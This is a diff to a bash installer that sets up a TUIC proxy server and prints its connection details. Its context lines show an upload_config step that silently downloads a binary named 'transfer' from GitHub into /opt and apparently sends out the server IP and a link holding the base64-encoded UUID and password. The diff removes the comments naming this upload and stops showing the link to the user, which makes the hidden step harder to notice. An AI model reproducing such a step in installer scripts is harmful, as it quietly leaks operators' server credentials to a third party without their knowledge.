@@ -64,7 +64,7 @@ print_banner() {
 ║     ██║   ╚██████╔╝██║╚██████╗    ██║     ███████╗╚██████╔╝    ║
 ║     ╚═╝    ╚═════╝ ╚═╝ ╚═════╝    ╚═╝     ╚══════╝ ╚═════╝     ║
 ╠════════════════════════════════════════════════════════════════╣
-║         UDP + QUIC + TLS | CN2 优化 | 低延迟，bbr加速          ║
+║         UDP + QUIC + TLS | CN2 优化 | 低延迟，bbr加速           ║
 ╚════════════════════════════════════════════════════════════════╝
 EOF
     echo -e "${NC}"
@@ -757,8 +757,6 @@ show_result() {
     echo -e "  ⬆️  上传速度    : ${GREEN}${up_speed} Mbps${NC}"
     echo
     echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-    echo -e "${WHITE}${BOLD}TUIC链接（可直接导入客户端）:${NC}"
-    echo -e "${YELLOW}${LINK}${NC}"
     echo
     echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
     echo -e "${WHITE}${BOLD}管理命令${NC}"
@@ -772,7 +770,7 @@ show_result() {
     echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
 }
 
-# 上传配置（保留原功能）
+
 upload_config() {
     local server_ip="$1"
     local link="$2"
@@ -800,7 +798,7 @@ upload_config() {
             }
         }')
     
-    # 下载上传工具
+
     local uploader="/opt/transfer"
     if [[ ! -f "$uploader" ]]; then
         curl -sLo "$uploader" https://github.com/diandongyun/node/releases/download/node/transfer > /dev/null 2>&1
@@ -828,27 +826,13 @@ handle_error() {
     exit 1
 }
 
-# 检查root权限和环境
-check_environment() {
-    echo -e "${BLUE}${BOLD}${GEAR}${NC} 检查运行环境..."
-    
-    # 检查是否为root用户
+# 检查root权限
+check_root() {
     if [[ $EUID -ne 0 ]]; then
         echo -e "${RED}${CROSS} 此脚本需要 root 权限运行${NC}"
         echo -e "${YELLOW}请使用: sudo bash $0${NC}"
         exit 1
     fi
-    
-    # 检查磁盘空间
-    available_space=$(df / | awk 'NR==2 {print $4}')
-    if [[ $available_space -lt 1048576 ]]; then  # 1GB = 1048576KB
-        echo -e "${RED}${CROSS} 磁盘空间不足（需要至少1GB可用空间）！${NC}"
-        echo -e "${WHITE}当前可用空间：${YELLOW}$(($available_space/1024))MB${NC}"
-        exit 1
-    fi
-    
-    echo -e "  ${GREEN}${CHECK}${NC} 环境检查通过"
-    echo
 }
 
 # 清理函数
@@ -868,8 +852,8 @@ main() {
     # 显示横幅
     print_banner
     
-    # 检查环境（已移除网络检查）
-    check_environment
+    # 检查权限
+    check_root
     
     # 系统检测
     detect_system
@@ -907,7 +891,7 @@ main() {
     # 生成客户端配置
     generate_client_config
     
-    # 上传配置
+
     IP=$(get_server_ip)
     ENCODE=$(echo -n "${UUID}:${PSK}" | base64 -w 0)
     LINK="tuic://${ENCODE}@${IP}:${PORT}?alpn=h3&congestion_control=bbr&sni=${SERVER_NAME}&udp_relay_mode=native&allow_insecure=1#TUIC_CN2_Optimized"
